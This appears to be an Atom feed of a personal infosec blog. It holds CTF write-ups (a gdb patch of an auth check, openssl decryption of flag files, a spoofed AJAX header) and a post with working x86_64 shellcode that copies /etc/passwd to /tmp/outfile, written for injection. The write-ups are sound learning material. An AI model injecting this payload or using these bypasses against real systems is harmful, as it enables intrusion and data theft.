</span><span class='line'>   0x08048dde &lt;+345>:  mov    DWORD PTR [esp+0x8],0x11
</span><span class='line'>   0x08048de6 &lt;+353>:  mov    DWORD PTR [esp+0x4],0x2
</span><span class='line'>   0x08048dee &lt;+361>:  mov    DWORD PTR [esp],0x2
</span><span class='line'>   0x08048df5 &lt;+368>:  call   0x8057100 &lt;socket>
</span><span class='line'>   0x08048dfa &lt;+373>:  mov    DWORD PTR [esp+0x38],eax
</span><span class='line'>   0x08048dfe &lt;+377>:  cmp    DWORD PTR [esp+0x38],0x0
</span><span class='line'>   0x08048e03 &lt;+382>:  jns    0x8048e34 &lt;main+431>
</span><span class='line'>   0x08048e05 &lt;+384>:  mov    eax,ds:0x80e453c
</span><span class='line'>   0x08048e0a &lt;+389>:  mov    DWORD PTR [esp+0xc],eax
</span><span class='line'>   0x08048e0e &lt;+393>:  mov    DWORD PTR [esp+0x8],0x16
</span><span class='line'>   0x08048e16 &lt;+401>:  mov    DWORD PTR [esp+0x4],0x1
</span><span class='line'>   0x08048e1e &lt;+409>:  mov    DWORD PTR [esp],0x80babab
</span><span class='line'>   0x08048e25 &lt;+416>:  call   0x8049900 &lt;fwrite>
</span><span class='line'>   0x08048e2a &lt;+421>:  mov    eax,0x1
</span><span class='line'>   0x08048e2f &lt;+426>:  jmp    0x8048eed &lt;main+616>
</span><span class='line'>   0x08048e34 &lt;+431>:  mov    eax,DWORD PTR [esp+0x38]
</span><span class='line'>   0x08048e38 &lt;+435>:  mov    DWORD PTR [esp+0xc],eax
</span><span class='line'>   0x08048e3c &lt;+439>:  mov    eax,DWORD PTR [esp+0x44]
</span><span class='line'>   0x08048e40 &lt;+443>:  mov    DWORD PTR [esp+0x8],eax
</span><span class='line'>   0x08048e44 &lt;+447>:  mov    eax,DWORD PTR [esp+0x48]
</span><span class='line'>   0x08048e48 &lt;+451>:  mov    DWORD PTR [esp+0x4],eax
</span><span class='line'>   0x08048e4c &lt;+455>:  mov    eax,DWORD PTR [esp+0x4c]
</span><span class='line'>   0x08048e50 &lt;+459>:  mov    DWORD PTR [esp],eax
</span><span class='line'>   0x08048e53 &lt;+462>:  call   0x8048aec &lt;sendAuth>
</span><span class='line'>   0x08048e58 &lt;+467>:  test   eax,eax
</span><span class='line'>   0x08048e5a &lt;+469>:  je     0x8048ec3 &lt;main+574>
</span><span class='line'>   0x08048e5c &lt;+471>:  mov    eax,DWORD PTR [esp+0x38]
</span><span class='line'>   0x08048e60 &lt;+475>:  mov    DWORD PTR [esp],eax
</span><span class='line'>   0x08048e63 &lt;+478>:  call   0x8048bde &lt;recvAuth>
</span><span class='line'>   0x08048e68 &lt;+483>:  test   eax,eax
</span><span class='line'>   0x08048e6a &lt;+485>:  je     0x8048eb5 &lt;main+560>
</span><span class='line'>   0x08048e6c &lt;+487>:  mov    DWORD PTR [esp],0x80babc2
</span><span class='line'>   0x08048e73 &lt;+494>:  call   0x8049a50 &lt;puts>
</span><span class='line'>   0x08048e78 &lt;+499>:  mov    DWORD PTR [esp+0x40],0x0
</span><span class='line'>   0x08048e80 &lt;+507>:  jmp    0x8048ea0 &lt;main+539>
</span><span class='line'>   0x08048e82 &lt;+509>:  lea    edx,[esp+0x13]
</span><span class='line'>   0x08048e86 &lt;+513>:  mov    eax,DWORD PTR [esp+0x40]
</span><span class='line'>   0x08048e8a &lt;+517>:  add    eax,edx
</span><span class='line'>   0x08048e8c &lt;+519>:  mov    al,BYTE PTR [eax]
</span><span class='line'>   0x08048e8e &lt;+521>:  xor    eax,0x17
</span><span class='line'>   0x08048e91 &lt;+524>:  movsx  eax,al
</span><span class='line'>   0x08048e94 &lt;+527>:  mov    DWORD PTR [esp],eax
</span><span class='line'>   0x08048e97 &lt;+530>:  call   0x8049c80 &lt;putchar>
</span><span class='line'>   0x08048e9c &lt;+535>:  inc    DWORD PTR [esp+0x40]
</span><span class='line'>   0x08048ea0 &lt;+539>:  cmp    DWORD PTR [esp+0x40],0x24
</span><span class='line'>   0x08048ea5 &lt;+544>:  jle    0x8048e82 &lt;main+509>
</span><span class='line'>   0x08048ea7 &lt;+546>:  mov    DWORD PTR [esp],0xa
</span><span class='line'>   0x08048eae &lt;+553>:  call   0x8049c80 &lt;putchar>
</span><span class='line'>   0x08048eb3 &lt;+558>:  jmp    0x8048ee8 &lt;main+611>
</span><span class='line'>   0x08048eb5 &lt;+560>:  mov    DWORD PTR [esp],0x80babca
</span><span class='line'>   0x08048ebc &lt;+567>:  call   0x8049a50 &lt;puts>
</span><span class='line'>   0x08048ec1 &lt;+572>:  jmp    0x8048ee8 &lt;main+611>
</span><span class='line'>   0x08048ec3 &lt;+574>:  mov    eax,ds:0x80e453c
</span><span class='line'>   0x08048ec8 &lt;+579>:  mov    DWORD PTR [esp+0xc],eax
</span><span class='line'>   0x08048ecc &lt;+583>:  mov    DWORD PTR [esp+0x8],0x1e
</span><span class='line'>   0x08048ed4 &lt;+591>:  mov    DWORD PTR [esp+0x4],0x1
</span><span class='line'>   0x08048edc &lt;+599>:  mov    DWORD PTR [esp],0x80babe4
</span><span class='line'>   0x08048ee3 &lt;+606>:  call   0x8049900 &lt;fwrite>
</span><span class='line'>   0x08048ee8 &lt;+611>:  mov    eax,0x0
</span><span class='line'>   0x08048eed &lt;+616>:  lea    esp,[ebp-0xc]
</span><span class='line'>   0x08048ef0 &lt;+619>:  pop    ebx
</span><span class='line'>   0x08048ef1 &lt;+620>:  pop    esi
</span><span class='line'>   0x08048ef2 &lt;+621>:  pop    edi
</span><span class='line'>   0x08048ef3 &lt;+622>:  pop    ebp
</span><span class='line'>   0x08048ef4 &lt;+623>:  ret    
</span><span class='line'>End of assembler dump.</span></code></pre></td></tr></table></div></figure>


<p>The disassembly for main is pretty crazy, but if you just walk through it, it&rsquo;s not too bad. It does some argument checking, creates a socket (0x08048df5 &lt;+368>), sends the authentication data (0x08048e53 &lt;+462>), receives the authentication response (0x08048e63 &lt;+478>), and some more nonsense towards the end.</p>

<p>Something interesting that I noticed is that right after we receive the authentication data, a test is done on eax against eax (0x08048e68 &lt;+483>). In assembly, the return value of a function is stored in eax, so this test is looking to verify the return of the recvAuth method. I think it is safe to assume that here is where the program will decide to give us either the &ldquo;bad username or password&rdquo; text, or continue on to do something more.</p>

<p>Before I continued, I had to look up what test actually did. From <a href="https://stackoverflow.com/questions/13064809/the-point-of-test-eax-eax">this question on StackOverflow</a>, &ldquo;TEST sets the Zero Flag if the the result of the AND operation is zero. If two operands are equal, their bitwise AND is zero iff both are zero. It also sets the Sign Flag if the top bit is set in the result, and the Parity Flag if the number of set bits is even.&rdquo; What this means is that in our program, if eax is set to 0x0, then the program will jump to 0x8048eb5 &lt;main+560>, which is towards the end of the program. If we put a breakpoint at this location and look at the registers and disassembly, we can see this happen.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb>break *0x08048e68
</span><span class='line'>Breakpoint 1 at 0x8048e68
</span><span class='line'>gdb>run
</span><span class='line'>Starting program: /home/chiggins/DerbyCon4.0/74/DRIVE_C/TRNDOCS/PGET_A.OUT -s 127.0.0.1 -u username -p password
</span><span class='line'>Got object file from memory but can't read symbols: File truncated.
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x08048e68 in main ()
</span><span class='line'>gdb>info registers 
</span><span class='line'>eax            0x0    0x0
</span><span class='line'>ecx            0xffffd5e8 0xffffd5e8
</span><span class='line'>edx            0xffffd54a 0xffffd54a
</span><span class='line'>ebx            0x0    0x0
</span><span class='line'>esp            0xffffd610 0xffffd610
</span><span class='line'>ebp            0xffffd678 0xffffd678
</span><span class='line'>esi            0x0    0x0
</span><span class='line'>edi            0xffffd648 0xffffd648
</span><span class='line'>eip            0x8048e68  0x8048e68 &lt;main+483>
</span><span class='line'>eflags         0x287  [ CF PF SF IF ]
</span><span class='line'>cs             0x23   0x23
</span><span class='line'>ss             0x2b   0x2b
</span><span class='line'>ds             0x2b   0x2b
</span><span class='line'>es             0x2b   0x2b
</span><span class='line'>fs             0x0    0x0
</span><span class='line'>gs             0x63   0x63
</span><span class='line'>gdb>disassemble main
</span><span class='line'>Dump of assembler code for function main:
</span><span class='line'>[... snip ...]
</span><span class='line'>   0x08048e53 &lt;+462>:  call   0x8048aec &lt;sendAuth>
</span><span class='line'>   0x08048e58 &lt;+467>:  test   eax,eax
</span><span class='line'>   0x08048e5a &lt;+469>:  je     0x8048ec3 &lt;main+574>
</span><span class='line'>   0x08048e5c &lt;+471>:  mov    eax,DWORD PTR [esp+0x38]
</span><span class='line'>   0x08048e60 &lt;+475>:  mov    DWORD PTR [esp],eax
</span><span class='line'>   0x08048e63 &lt;+478>:  call   0x8048bde &lt;recvAuth>
</span><span class='line'>=> 0x08048e68 &lt;+483>:  test   eax,eax
</span><span class='line'>   0x08048e6a &lt;+485>:  je     0x8048eb5 &lt;main+560>
</span><span class='line'>   0x08048e6c &lt;+487>:  mov    DWORD PTR [esp],0x80babc2
</span><span class='line'>   0x08048e73 &lt;+494>:  call   0x8049a50 &lt;puts>
</span><span class='line'>   0x08048e78 &lt;+499>:  mov    DWORD PTR [esp+0x40],0x0
</span><span class='line'>   0x08048e80 &lt;+507>:  jmp    0x8048ea0 &lt;main+539>
</span><span class='line'>   0x08048e82 &lt;+509>:  lea    edx,[esp+0x13]
</span><span class='line'>[... snip ...]
</span><span class='line'>End of assembler dump.
</span><span class='line'>gdb>continue
</span><span class='line'>Continuing.
</span><span class='line'>bad username or password
</span><span class='line'>[Inferior 1 (process 11299) exited normally]</span></code></pre></td></tr></table></div></figure>


<p>So after recvAuth eax was set to 0x0 which caused the result from test to jump to the end of the program and show the bad password message. What happens if we set eax to 0x1, maybe it will bypass the jump and continue onto something more interesting.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb>run
</span><span class='line'>Starting program: /home/chiggins/DerbyCon4.0/74/DRIVE_C/TRNDOCS/PGET_A.OUT -s 127.0.0.1 -u username -p password
</span><span class='line'>Got object file from memory but can't read symbols: File truncated.
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x08048e68 in main ()
</span><span class='line'>gdb>disassemble main
</span><span class='line'>Dump of assembler code for function main:
</span><span class='line'>[... snip ...]
</span><span class='line'>   0x08048e53 &lt;+462>:   call   0x8048aec &lt;sendAuth>
</span><span class='line'>   0x08048e58 &lt;+467>:   test   eax,eax
</span><span class='line'>   0x08048e5a &lt;+469>:   je     0x8048ec3 &lt;main+574>
</span><span class='line'>   0x08048e5c &lt;+471>:   mov    eax,DWORD PTR [esp+0x38]
</span><span class='line'>   0x08048e60 &lt;+475>:   mov    DWORD PTR [esp],eax
</span><span class='line'>   0x08048e63 &lt;+478>:   call   0x8048bde &lt;recvAuth>
</span><span class='line'>=> 0x08048e68 &lt;+483>:   test   eax,eax
</span><span class='line'>   0x08048e6a &lt;+485>:   je     0x8048eb5 &lt;main+560>
</span><span class='line'>   0x08048e6c &lt;+487>:   mov    DWORD PTR [esp],0x80babc2
</span><span class='line'>   0x08048e73 &lt;+494>:   call   0x8049a50 &lt;puts>
</span><span class='line'>   0x08048e78 &lt;+499>:   mov    DWORD PTR [esp+0x40],0x0
</span><span class='line'>   0x08048e80 &lt;+507>:   jmp    0x8048ea0 &lt;main+539>
</span><span class='line'>   0x08048e82 &lt;+509>:   lea    edx,[esp+0x13]
</span><span class='line'>[... snip ...]
</span><span class='line'>End of assembler dump.
</span><span class='line'>gdb>info registers 
</span><span class='line'>eax            0x0    0x0
</span><span class='line'>ecx            0xffffd5e8 0xffffd5e8
</span><span class='line'>edx            0xffffd54a 0xffffd54a
</span><span class='line'>ebx            0x0    0x0
</span><span class='line'>esp            0xffffd610 0xffffd610
</span><span class='line'>ebp            0xffffd678 0xffffd678
</span><span class='line'>esi            0x0    0x0
</span><span class='line'>edi            0xffffd648 0xffffd648
</span><span class='line'>eip            0x8048e68  0x8048e68 &lt;main+483>
</span><span class='line'>eflags         0x287  [ CF PF SF IF ]
</span><span class='line'>cs             0x23   0x23
</span><span class='line'>ss             0x2b   0x2b
</span><span class='line'>ds             0x2b   0x2b
</span><span class='line'>es             0x2b   0x2b
</span><span class='line'>fs             0x0    0x0
</span><span class='line'>gs             0x63   0x63
</span><span class='line'>gdb>set $eax = 0x1
</span><span class='line'>gdb>info registers
</span><span class='line'>eax            0x1    0x1
</span><span class='line'>ecx            0xffffd5e8 0xffffd5e8
</span><span class='line'>edx            0xffffd54a 0xffffd54a
</span><span class='line'>ebx            0x0    0x0
</span><span class='line'>esp            0xffffd610 0xffffd610
</span><span class='line'>ebp            0xffffd678 0xffffd678
</span><span class='line'>esi            0x0    0x0
</span><span class='line'>edi            0xffffd648 0xffffd648
</span><span class='line'>eip            0x8048e68  0x8048e68 &lt;main+483>
</span><span class='line'>eflags         0x287  [ CF PF SF IF ]
</span><span class='line'>cs             0x23   0x23
</span><span class='line'>ss             0x2b   0x2b
</span><span class='line'>ds             0x2b   0x2b
</span><span class='line'>es             0x2b   0x2b
</span><span class='line'>fs             0x0    0x0
</span><span class='line'>gs             0x63   0x63
</span><span class='line'>gdb>continue
</span><span class='line'>Continuing.
</span><span class='line'>Success
</span><span class='line'>The secret key is EverybodyDoTheLimit
</span><span class='line'>[Inferior 1 (process 11416) exited normally]</span></code></pre></td></tr></table></div></figure>


<p>Woah! Would you look at that, got something juicy. I tried to submit &ldquo;EverybodyDoTheLimit&rdquo; as a flag, but it ended up not being valid. But if you recall back to the FTP MOTD at the beginning of the post, we can now expect the TRN documents via openssl with the newly acquired secret key. After running through the various encrypted files, I finally ran into one with a flag in it.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[chiggins@vader ~/DerbyCon4.0/74/DRIVE_C/TRNDOCS/ATL]$ openssl des3 -d -salt -in 2.TRN -k EverybodyDoTheLimit
</span><span class='line'>invoice: 19755
</span><span class='line'>order: 11389
</span><span class='line'>customer: 24956
</span><span class='line'>scrip: flag
</span><span class='line'>days: 90
</span><span class='line'>addr1: CountingSheep75
</span><span class='line'>addr2: 8982 Elm
</span><span class='line'>addr3; Henderson LA 13131</span></code></pre></td></tr></table></div></figure>


<p>Submitted &ldquo;CountingSheep75&rdquo; to the scoring engine, and received 450 points. Woo!</p>

<p>Since I&rsquo;ve really been getting into reverse engineering and debugging lately, this was a really fun challenge for me. Thanks to the DerbyCon CTF crew for creating this one!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[BSides Chicago 2014 CTF -- Cleaning Product Request]]></title>
    <link href="http://chigstuff.com/blog/2014/04/28/bsides-chicago-2014-ctf-cleaning-product-request/"/>
    <updated>2014-04-28T18:56:31-05:00</updated>
    <id>http://chigstuff.com/blog/2014/04/28/bsides-chicago-2014-ctf-cleaning-product-request</id>
    <content type="html"><![CDATA[<p>At BSides Chicago 2014 this weekend I participated in the Tricity BSJTF CTF with team Penguins. One of the challenges that caused me the most rage and an epic face-palm once I figured it out was the &ldquo;Cleaning Product Request&rdquo; <em>easy</em> web challenge. Yes, I know, it was an &ldquo;easy&rdquo; challenge. I was just over thinking it and kept beating my head against the wall.</p>

<!--more-->


<blockquote><p>BEGIN TRANSMISSION</p><p>TARGET: BSides Joint Task Force<br/>LOCATION: TOP SECRET ()</p><p>DETAILS:</p><p>During our analysis of local agents systems we found a rogue file on our systems. We are not sure what it does but we are sure an agent has something to do with it. We tried to refer this to to our guys down in the lab but they said it should have been referred to someone else. That&#8217;s why we are getting <br/>you involved.</p><p><a href="https://bsjtf.com/f291lsf.php?flag=gimmie">https://bsjtf.com/f291lsf.php?flag=gimmie</a></p><p>Hint: AJAX</p><p>Good luck agent!</p><p>END TRANSMISSION</p></blockquote>


<p>So when you first visit the website the website, all you get is a message saying &ldquo;Access Denied.&rdquo; I started up Burp and captured the request to see if anything interesting stuck out, but no luck. I also tried to mess around with the referer header since that was the key to a challenge at last years CTF, but again no luck. The @bsjtf was tweeting out hints related to this challenge such as &ldquo;What&rsquo;s a utility that is also a cleaning product?&rdquo;, &ldquo;There are all sorts of things that can be &#8220;spoofed&rdquo;. Especially when looking for &ldquo;cleaning product&rdquo; requests. #tricityctf&#8221;, and what finally gave me the final push, &ldquo;How do you check to see if an request was sent via AJAX?&rdquo;.</p>

<p><img class="center" src="http://chigstuff.com/images/bsides_2014_cleaning/1.png" width="750"></p>

<p>If you look up how AJAX requests work, you&rsquo;ll see that the X_REQUESTED_WITH header is set to XMLHTTPRequest. In Burp I send the request to repeater, added in the X_REQUESTED_WITH header, set it to XMLHTTPRequest, sent out the request, and boom, flag acquired. Ben0xA, you&rsquo;re going to give me gray hair with simple silly challenges like this!</p>

<p><img class="center" src="http://chigstuff.com/images/bsides_2014_cleaning/2.png" width="750"></p>

<p><img class="center" src="http://chigstuff.com/images/bsides_2014_cleaning/3.png" width="750"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[My First Shellcode]]></title>
    <link href="http://chigstuff.com/blog/2014/03/29/my-first-shellcode/"/>
    <updated>2014-03-29T17:11:42-05:00</updated>
    <id>http://chigstuff.com/blog/2014/03/29/my-first-shellcode</id>
    <content type="html"><![CDATA[<p>Lately I&rsquo;ve been wanting to explore some of what I call the &ldquo;black magic&rdquo; of infosec, reverse engineering and shellcoding. Whenever I see some posting or article that comes out on this I always become curious and bewildered at what I&rsquo;m looking at because I just don&rsquo;t understand it. On Twitter I&rsquo;ve been seeing <a href="http://twitter.com/SecurityTube">@SecurityTube</a> advertise their <a href="http://www.pentesteracademy.com/course?id=7">x86_64 Assembly and Shellcoding on Linux</a> video course, so I decided to drop some money and learn what I can from it. I&rsquo;ve yet to fully finish it, but more on that later.</p>

<!--more-->


<p>If I want to learn something, I usually have to do that something, get the hands on experience. I&rsquo;m only about a third of the way through the course, only just going through assembly basics. But I decided to take a small break and try to write some shellcode of my own. I went exploring through the <a href="http://shell-storm.org/shellcode/">Shellcode Database</a> and found a bit of x86 shellcode that I wanted to translate over to work on an x86_64 system. After some searching, I found one that <a href="http://www.shell-storm.org/shellcode/files/shellcode-864.php">copies /etc/passwd to /tmp/outfile</a> written by <a href="https://github.com/polslinux">Paolo Stivanin</a>. Because of how trivial and simple looking the shellcode was, I decided to translate it over to work on x86_64.</p>

<p>After a few days of constant Googling and debugging and spending more time in gdb I&rsquo;d care to admit, I finally got a working bit of shellcode that works on x86_64 Linux that copies the contents of /etc/passwd to /tmp/outfile. It is sitting at 118 bytes and contains no null bytes, so you&rsquo;ll be able to inject it when necessary. I know it is nothing super fancy but it works and hopefully it can be found useful to someone.</p>

<p>For those that are interested in dissecting the following code, it is using the sys_open, sys_read, and sys_write syscalls. This might be able to use some optimization, so if anyone finds anything please let me know!</p>

<div><script src='https://gist.github.com/9820129.js'></script>
<noscript><pre><code>/*
Reads data from /etc/passwd to /tmp/outfile
No null bytes

Author: Chris Higgins &lt;chris@chigs.me&gt;
        @ch1gg1ns -- github.com/chiggins
        chigstuff.com
Date:   3-27-2014
Size:   118 bytes
Tested: ArchLinux x86_64 3.13.6-1
Assembly:
        xor rax, rax
        mov al, 2
        xor rdi, rdi
        mov rbx, 0x647773
        push rbx
        mov rbx, 0x7361702f6374652f
        push rbx
        lea rdi, [rsp]
        xor rsi, rsi
        syscall
        mov rbx, rax
        xor rax, rax
        mov rdi, rbx
        mov rsi, rsp
        mov dx, 0xFFFF
        syscall
        mov r8, rax
        mov rax, rsp
        xor rbx, rbx
        push rbx
        mov rbx, 0x656c6966
        push rbx
        mov rbx, 0x74756f2f706d742f
        push rbx
        mov rbx, rax
        xor rax, rax
        mov al, 2
        lea rdi, [rsp]
        xor rsi, rsi
        push 0x66
        pop si
        syscall
        mov rdi, rax
        xor rax, rax
        mov al, 1
        lea rsi, [rbx]
        xor rdx, rdx
        mov rdx, r8
        syscall
*/

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

char shellcode[] = &quot;\x48\x31\xc0\xb0\x02\x48\x31\xff\xbb\x73\x77\x64\x00\x53\x48\xbb\x2f\x65\x74\x63\x70\x61\x73\x53\x48\x8d\x3c\x24\x48\x31\xf6\x0f\x05\x48\x89\xc3\x48\x31\xc0\x48\x89\xdf\x48\x89\xe6\x66\xba\xff\xff\x0f\x05\x49\x89\xc0\x48\x89\xe0\x48\x31\xdb\x53\xbb\x66\x69\x6c\x65\x53\x48\xbb\x2f\x74\x6d\x70\x6f\x75\x74\x53\x48\x89\xc3\x48\x31\xc0\xb0\x02\x48\x8d\x3c\x24\x48\x31\xf6\x6a\x66\x66\x5e\x0f\x05\x48\x89\xc7\x48\x31\xc0\xb0\x01\x48\x8d\x33\x48\x31\xd2\x4c\x89\xc2\x0f\x05&quot;;

int main() {
    printf(&quot;len: %d bytes&quot;, sizeof shellcode);
    (*(void (*)()) shellcode);
    return 0;
}
</code></pre></noscript></div>


<p>Resources:<br />
<a href="http://www.shell-storm.org/shellcode/files/shellcode-867.php">http://www.shell-storm.org/shellcode/files/shellcode-867.php</a></p>

<p><a href="http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64">http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64</a></p>

<p><a href="http://man7.org/linux/man-pages/man2/open.2.html">http://man7.org/linux/man-pages/man2/open.2.html</a></p>

<p><a href="https://en.wikipedia.org/wiki/X86-64">https://en.wikipedia.org/wiki/X86-64</a></p>

<p><a href="http://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump">http://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[New Blog With Octopress]]></title>
    <link href="http://chigstuff.com/blog/2014/02/26/new-blog-with-octopress/"/>
    <updated>2014-02-26T11:05:58-06:00</updated>
    <id>http://chigstuff.com/blog/2014/02/26/new-blog-with-octopress</id>
    <content type="html"><![CDATA[<p>Well, this is embarrassing. A few weeks ago I decided to change things up a bit on my server, move from Ubuntu to Arch Linux, reconfigure a few things and do some clean-up. Well, apparently past Chris decided it would be a grand idea to forget to copy over my back-up files to a disk that wasn&rsquo;t about to be blown away&hellip; How awakward.</p>

<p>I thought to use photorec and try to recover my missing data. The only data I really cared about was my old Wordpress blog database, and the custom theme I made. But I decided it might just be better to start anew. In a short Twitter exchange, WiK (<a href="https://twitter.com/jaimefilson">@jamiefilson</a>) suggested I take a look at <a href="http://octopress.org">Octopress</a>. After delving into the Octopress documentation, I decided to give it a go. Now I&rsquo;m using Octopress and Github Pages for this blog, and hopefully I&rsquo;ll actually pay more attention to actually putting up some content.</p>

<p>So here I am. I&rsquo;ll get around to putting up more posts and create a theme of my own in the next coming weeks. I guess we&rsquo;ll see what happens!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[BSides Chicago 2013 CTF Challenge #31 Write Up]]></title>
    <link href="http://chigstuff.com/blog/2013/04/30/bsides-chicago-2013-ctf-challenge-number-31-write-up/"/>
    <updated>2013-04-30T13:45:44-05:00</updated>
    <id>http://chigstuff.com/blog/2013/04/30/bsides-chicago-2013-ctf-challenge-number-31-write-up</id>
    <content type="html"><![CDATA[<p>The BSides Chicago 2013 CTF was a fun one and quite the learning experience, so here’s my first ever write up and it’s going to be on challenge #31, easy reverse engineering on a .NET console application.</p>

<p><img class="center" src="http://chigstuff.com/images/bsides_2013_31/1.jpg"></p>

<!--more-->


<p>Here is the challenge description:</p>

<blockquote><p>As a new agent, you may have some fears about being treated less than what you are worth. Well don’t you worry your little head one little bit tiger. You’ll be treated with the same level of respect as every other agent here. You are your own person. Ready to take on the challenges here. We consider you one of our top agents!</p><p>We have recovered an executable from the rogue agent’s computer. Please analyze the file and crack the key. We picked you because you are the brightest and the best, but before you start can you get me some coffee?</p></blockquote>


<p>The application seems to be pretty straight forward. Just a simple login form that when properly authenticated, would show the key that you need in order to complete the challenge.</p>

<p><img class="center" src="http://chigstuff.com/images/bsides_2013_31/2.jpg"></p>

<p>Opening the executable in IDA showed a ton of .NET assembly references. Since that was the case, I decided to open the exe up in Reflector instead for better working with .NET. I disassembled the file and began to look at the main() function.</p>

<p><img class="center" src="http://chigstuff.com/images/bsides_2013_31/3.jpg" width="740"></p>

<p>Looking at the code, you can see that you can totally skip past the while loop to bypass authentication. Then at the top you can see where a Base64 encoded string converted into a byte array is supplied. That is referenced after the login code, where it’s SHA1 hash is computed, then turned into a Base16 string with the custom ToBase16 method:</p>

<p><img class="center" src="http://chigstuff.com/images/bsides_2013_31/4.jpg" width="740"></p>

<p>With all of this information, I decided to spin up Visual Studio quick, copy paste over the necessary code that I needed and generate the key myself.</p>

<p><img class="center" src="http://chigstuff.com/images/bsides_2013_31/5.jpg" width="740"></p>

<p><img class="center" src="http://chigstuff.com/images/bsides_2013_31/6.jpg"></p>

<p>Oh hello there key. End up doing some copy/pasta into the CTF framework, submit it, and receive points! I rarely do any reverse engineering, so this was a very cool learning experience for me and I thought that it would be cool to share with others.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Thotcon 0x4 and BSides Chicago 2013]]></title>
    <link href="http://chigstuff.com/blog/2013/04/29/thotcon-0x4-and-bsides-chicago-2013/"/>
    <updated>2013-04-29T14:20:34-05:00</updated>
    <id>http://chigstuff.com/blog/2013/04/29/thotcon-0x4-and-bsides-chicago-2013</id>
    <content type="html"><![CDATA[<p><img class="center" src="http://chigstuff.com/images/thotcon_bsides_2013_writeup/bsides-badge.jpg" width="500"></p>

<p>So this past weekend I was in Chicago for <a href="http://twitter.com/thotcon">Thotcon 0×4</a> and <a href="http://twitter.com/bsideschicago">BSides Chicago 2013</a>. Quite fun stuff since I haven’t been to a con since <a href="http://twitter.com/Derbycon">Derbycon</a>. I was really looking forward to catching up with some people, checking out some talks, and participating in the CTF at BSides.</p>

<!-- more-->


<p>Friday rolls around, we head to Thotcon and get all sorts of checked in. Those badges were really flippin’ sweet. Arduinos with a ZigBee interface and a matrix of LED’s to display text and such. I haven’t quite figured out what exactly the badges do, but I guess if the ZigBee interface happens to get close enough to a number of beacons placed around the conference, then you get more LED dots lit up on your badge. The more the merrier. Still need to play around with it some more…</p>

